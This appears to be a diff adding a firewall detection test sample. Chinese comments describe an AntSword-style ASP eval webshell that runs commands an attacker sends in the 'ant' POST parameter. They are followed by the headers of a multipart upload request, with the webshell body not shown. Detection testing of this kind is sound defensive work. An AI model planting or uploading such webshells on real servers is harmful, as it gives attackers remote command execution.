@@ -1,0 +1,15 @@
+# webshell_AntSword_asp_eval_xxxx_25
+# 这是一个极其简单的Webshell变种文件，采用C#语言编写。攻击者可以通过发送POST请求，将内容传入ant参数，并使用eval函数执行命令
+# 基本信息：
+# - 文件名：asp_eval_xxxx.asp
+# - 文件大小：895B
+# 行为描述：
+# - 命令执行：接收并执行攻击者发送的系统命令，例如列出目录内容、修改文件权限等。
+POST /?bid=hd_tag_m8mv242f HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv242f
+RM-PRO-Token: 09c572708c49a6d72c1f5a5f3a822b77
+RM-PRO-Time: 1742808359823
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=260xuSHO1dt7BmylwTYD01Xtvwg_5wbo
+
